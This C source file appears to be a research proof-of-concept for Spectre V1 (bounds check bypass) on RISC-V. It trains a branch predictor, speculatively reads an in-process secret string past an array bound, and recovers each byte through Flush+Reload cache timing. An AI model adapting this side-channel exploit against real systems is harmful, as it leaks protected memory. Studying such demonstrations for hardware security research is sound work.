#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define NUM_TRAIN 6          // Training iterations, related to branch predictor state
#define NUM_ROUNDS 1         // Outer rounds (not really used in inner loop logic)
#define SAME_ATTACK_ROUNDS 10 // Repetitions for attacking the same secret index for reliability
#define SECRET_LEN 15        // Length of the secret string
#define CACHE_THRESHOLD 50   // Cache hit time threshold in cycles

uint64_t array1_size = 16;      // Initial size of array1 (bound for the check)
uint8_t padding1[64];           // Padding
// Array potentially indexed out-of-bounds speculatively
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; // Initialized values
uint8_t padding2[64];           // Padding
// Probe array for Flush+Reload cache side-channel attack
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
// Secret data located relative to array1
char* secretStr = "ThisIsTheSecretString";

/**
 * @brief Finds the indices and values of the top two largest elements in an array.
 * @param inputArray Input array of scores (e.g., cache hit counts).
 * @param inputSize Size of the input array.
 * @param outputIdxArray Output array storing the indices of the top two values.
 * @param outputValArray Output array storing the top two values.
 */
void findTopTwo(uint64_t* inputArray, uint64_t inputSize, uint8_t* outputIdxArray, uint64_t* outputValArray) {
    // Implementation identical to previous examples
    outputValArray[0] = 0; outputValArray[1] = 0; outputIdxArray[0] = 0; outputIdxArray[1] = 0;
    for (uint64_t i = 0; i < inputSize; ++i) {
        if (inputArray[i] > outputValArray[0]) {
            outputValArray[1] = outputValArray[0]; outputIdxArray[1] = outputIdxArray[0];
            outputValArray[0] = inputArray[i]; outputIdxArray[0] = i;
        } else if (inputArray[i] > outputValArray[1]) {
            outputValArray[1] = inputArray[i]; outputIdxArray[1] = i;
        }
    }
}

/**
 * @brief Victim function demonstrating Spectre V1 (Bounds Check Bypass).
 * It checks 'idx' against 'array1_size', but this check might be mispredicted.
 * If mispredicted, it accesses array1 out-of-bounds using 'idx' (which might point to secret data)
 * and then accesses array2 based on the loaded value, leaking it via cache side channel.
 * @param idx Index provided, potentially out-of-bounds during attack phase.
 */
void victimFunction(uint64_t idx) {
    uint8_t temp = 2; // Used for FP division below

    // Introduce delay in resolving array1_size using FP division.
    // This can potentially widen the speculation window for the bounds check bypass.
    // Note: This modifies the global array1_size value.
    array1_size = array1_size << 4; // Multiply size by 16
    // Complex FP division sequence; result stored back into array1_size
    asm volatile( // Use volatile
        "fcvt.s.lu  fa4, %[in]\n"        // Convert temp (2) to float
        "fcvt.s.lu  fa5, %[inout]\n"     // Convert array1_size to float
        "fdiv.s fa5, fa5, fa4\n"         // Divide by 2.0 (repeatedly)
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fcvt.lu.s  %[out], fa5, rtz\n"  // Convert back to uint64_t (truncating)
        : [out] "=r" (array1_size)       // Output: modified array1_size
        : [inout] "r" (array1_size), [in] "r" (temp) // Inputs
        : "fa4", "fa5");                 // Clobbered FP registers

    // Bounds check: vulnerable to Spectre V1 misprediction
    if (idx < array1_size) { // Predictor might assume true even if idx is out-of-bounds
        // ---- Speculative Execution Window ----
        // Access array1[idx] - If idx is out-of-bounds, this reads unintended data (e.g., secretStr)
        // Access array2 based on the value loaded from array1[idx], caching the corresponding line.
        temp = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
        // ---- End Speculative Window ----
        // printf("Not speculative\n"); // Only prints if branch is correctly taken non-speculatively
    }

    // Read cycle counter - might act as a speculation barrier or just add noise/delay
    temp = rdcycle();
    (void)temp; // Prevent unused variable warning
}

int main(void) {
    // Calculate offset for secret data relative to array1 start
    uint64_t attackIdx = (uint64_t)(secretStr - (char*)array1);
    uint64_t startTime, duration, inputIdx, randomIdx;
    uint8_t temp = 0;             // Dummy variable for cache reads
    static uint64_t results[256]; // Cache hit results

    printf("Starting Spectre V1 secret extraction...\n");

    // Loop through each byte of the secret
    for(uint64_t i = 0; i < SECRET_LEN; ++i) {

        // Reset results array
        for(uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        // Repeat attack sequence for reliability
        for(uint64_t round = 0; round < SAME_ATTACK_ROUNDS; ++round) {

            // Flush the probe array from cache
            flushCache((uint64_t)array2, sizeof(array2));

            // Branch predictor training and attack loop
            // The `(round & 1)` adds slight variation to training length.
            for(int64_t k = ((NUM_TRAIN + 1 + (round & 1)) * NUM_ROUNDS) - 1; k >= 0; --k) {
                // Conditionally select index for victimFunction:
                // Selects non-secret 'randomIdx' during training (k % (N+1...) != 0)
                // Selects secret-derived 'attackIdx' during attack phase (k % (N+1...) == 0)
                randomIdx = round % array1_size; // Non-secret index within initial array1_size bounds
                inputIdx = ((k % (NUM_TRAIN + 1 + (round & 1))) - 1) & ~0xFFFF;
                inputIdx = (inputIdx | (inputIdx >> 16));
                inputIdx = randomIdx ^ (inputIdx & (attackIdx ^ randomIdx));

                flushCache((uint64_t)array2, sizeof(array2));

                // Loop to potentially manipulate Branch History Register (BHR) state
                for(uint64_t l = 0; l < 30; ++l) {
                    asm(""); // Empty asm likely still involves a loop branch
                }

                // Call victim function with the selected index (either training or attack index)
                // printf("Calling victim with index %llu\n", (unsigned long long)inputIdx); // Debug print
                victimFunction(inputIdx);
            } // End training/attack loop k

            // Probe phase: Measure access time to array2 elements
            for (uint64_t m = 0; m < 256; ++m) {
                uint8_t* current_addr = &array2[m * L1_BLOCK_SZ_BYTES];
                startTime = rdcycle();
                temp &= *current_addr; // Access element
                duration = (rdcycle() - startTime);

                // Record cache hit if access time is below threshold
                if (duration < CACHE_THRESHOLD) {
                    results[m] += 1;
                }
            }
        } // End rounds loop

        // Analyze results: Find the byte value(s) with the most cache hits
        uint8_t bestGuess[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuess, bestHits);

        // Print the top two guesses for the current secret byte
        printf("Mem[0x%llx] = expect('%c') ?= guess(hits,dec,char) 1.(%llu, %d, %c) 2.(%llu, %d, %c)\n",
            (unsigned long long)(array1 + attackIdx), // Address of the source byte relative to array1
            secretStr[i],          // Expected character
            (unsigned long long)bestHits[0], bestGuess[0], (bestGuess[0] ? bestGuess[0] : '?'), // Top guess
            (unsigned long long)bestHits[1], bestGuess[1], (bestGuess[1] ? bestGuess[1] : '?')); // Second guess

        // Increment index offset for the next secret byte
        ++attackIdx;
    } // End main secret loop (i)

    printf("\nExtraction loop finished.\n");
    return 0;
}